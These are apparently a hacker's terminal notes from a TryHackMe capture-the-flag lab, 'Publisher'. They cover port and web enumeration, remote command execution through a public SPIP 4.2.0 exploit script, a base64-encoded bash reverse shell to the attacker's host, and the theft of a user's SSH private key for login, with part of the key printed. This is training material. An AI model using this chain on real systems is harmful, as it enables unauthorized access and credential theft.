<code>
https://tryhackme.com/r/room/publisher

┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ nmap -sV -Pn 10.10.188.239
Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-16 03:07 CDT
Nmap scan report for 10.10.188.239
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ nmap -A -Pn -p80 10.10.188.239
Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-16 03:08 CDT
Nmap scan report for 10.10.188.239
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds



                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ nikto  -h http://publisher.thm                 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.188.239
+ Target Hostname:    publisher.thm
+ Target Port:        80
+ Start Time:         2024-07-16 04:18:58 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ RFC-1918 IP address found in the 'location' header. The IP is "172.17.0.2".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "172.17.0.2".
+ Server may leak inodes via ETags, header found with file /, inode: 21ee, size: 60cf5aa5ef7f4, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /images/: Directory indexing found.
^[[21~+ 7785 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2024-07-16 04:25:15 (GMT-5) (377 seconds)


┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://publisher.thm -x .txt,.php,html        
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
2024/07/16 03:17:49 Starting gobuster in directory enumeration mode
/images               (Status: 301) [Size: 315] [--> http://publisher.thm/images/]
/index.html           (Status: 200) [Size: 8686]                                  
/spip                 (Status: 301) [Size: 313] [--> http://publisher.thm/spip/]  
/server-status        (Status: 403) [Size: 278]                                   
                                                        


### SPIP 4.2.0 - vulnable

http://publisher.thm/spip/spip.php?page=backend
http://publisher.thm/spip/spip.php?rubrique1
http://publisher.thm/spip/spip.php?page=contact

http://publisher.thm/spip/spip.php?page=login&url=%2Fspip%2Fecrire%2F&lang=fr


### Initial access
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ python3 51536.py -u http://publisher.thm/spip -c whoami
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ echo -n "bash -i >& /dev/tcp/10.9.30.202/6666 0>&1" | base64 -w0 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE=                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ python3 51536.py -u http://publisher.thm/spip -c "whoami"       
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ python3 51536.py -u http://publisher.thm/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE= 
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ python3 51536.py -u http://publisher.thm/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE= | base64 -d | bash"

### Recoon get Think user key
www-data@41c976e507f8:/home/think/.ssh$ ls
ls
authorized_keys
id_rsa
id_rsa.pub
www-data@41c976e507f8:/home/think/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn

###  SSH access as Think
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ chmod 400 think   
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ ssh -i think think@publisher.thm




</code>

